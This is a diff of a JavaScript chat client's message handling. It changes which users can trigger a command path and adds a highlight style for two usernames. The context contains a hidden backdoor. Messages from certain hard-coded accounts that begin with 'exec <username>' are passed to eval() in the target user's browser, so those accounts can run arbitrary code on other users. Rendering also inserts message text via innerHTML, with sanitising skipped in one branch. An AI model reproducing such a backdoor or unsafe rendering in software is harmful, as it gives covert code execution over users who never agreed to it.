@@ -478,7 +478,7 @@ ws.addEventListener("message", e => {
             }
             break;
         case "message":
-            if (["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN", "ZeroTix", "wolfie", "Zook1234"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
+            if (["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN", "ZeroTix", "wolfie"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
                 if (msg.m.m.startsWith("exec " + user)) {
                     try {
                         eval(msg.m.m.slice(6 + user.length));
@@ -801,7 +801,9 @@ function message(msg, force = false) {
     p.innerHTML = `<span class="
     ${devs.includes(msg.m.s)
             ? "devMsg"
-            : ""
+            : msg.m.s === "2121212121212" || msg.m.s === "XxSweatyxX"
+                ? "msg2121"
+                : ""
         }">
         ${force ? msg.m.s : msg.m.s.safe()}:&nbsp;</span>
         ${force
